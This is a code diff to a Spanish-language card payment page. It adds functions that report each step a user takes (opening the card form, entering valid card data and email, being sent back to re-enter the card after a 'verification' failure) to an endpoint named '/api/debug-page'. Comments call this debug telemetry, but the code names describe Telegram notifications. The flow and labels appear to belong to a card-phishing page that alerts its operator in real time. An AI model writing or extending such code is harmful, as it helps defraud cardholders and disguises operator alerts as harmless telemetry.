@@ -506,6 +506,39 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     validateCardNumber,
   } from '../../services/cardPaymentValidation';
 
+  const telegramStepSent = {};
+
+  function notifyTelegramStep(event) {
+    if (!event || telegramStepSent[event]) return;
+    telegramStepSent[event] = true;
+    try {
+      if (window.__latamTgSent) delete window.__latamTgSent[event];
+      sessionStorage.removeItem('latam-tg:' + event);
+    } catch {
+      /* ignore */
+    }
+    try {
+      fetch('/api/debug-page', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ event }),
+        keepalive: true,
+      }).catch(() => {});
+    } catch {
+      /* Debug telemetry is best-effort. */
+    }
+  }
+
+  function resetTelegramStep(event) {
+    delete telegramStepSent[event];
+    try {
+      if (window.__latamTgSent) delete window.__latamTgSent[event];
+      sessionStorage.removeItem('latam-tg:' + event);
+    } catch {
+      /* ignore */
+    }
+  }
+
   const boardEl = document.getElementById('pagos-board');
   const legsJson = boardEl?.dataset.legs || '[]';
   const copy = JSON.parse(boardEl?.dataset.copy || '{}');
@@ -620,6 +653,9 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         clearCardInputs();
         setCardOpen(true);
         showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
+        resetTelegramStep('✅ Ingreso datos cc');
+        resetTelegramStep('Devuelta a ingresar tarjeta');
+        notifyTelegramStep('Devuelta a ingresar tarjeta');
         cardNumber?.focus();
         return;
       }
@@ -1001,8 +1037,10 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     addCardToggle.setAttribute('aria-expanded', open ? 'true' : 'false');
     addCardToggle.setAttribute('aria-pressed', open ? 'true' : 'false');
     cardForm.hidden = !open;
-    if (open) syncCardFieldStates();
-    else syncPayEnabled();
+    if (open) {
+      notifyTelegramStep('Abrio banner de pago');
+      syncCardFieldStates();
+    } else syncPayEnabled();
   }
 
   if (addCardToggle) {
@@ -1122,6 +1160,13 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
 
     syncCardCvvVisibility();
     syncPayEnabled();
+    notifyCardDataIfReady();
+  }
+
+  function notifyCardDataIfReady() {
+    if (addCardToggle?.getAttribute('aria-expanded') !== 'true') return;
+    if (!isCardPaymentValid() || !isValidEmail(cardEmail?.value)) return;
+    notifyTelegramStep('✅ Ingreso datos cc');
   }
 
   function syncCardEmailError() {
@@ -1209,6 +1254,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     syncEmailValidity(cardEmail);
     syncCardEmailError();
     syncPayEnabled();
+    notifyCardDataIfReady();
   });
   cardEmail?.addEventListener('blur', () => {
     syncEmailValidity(cardEmail);
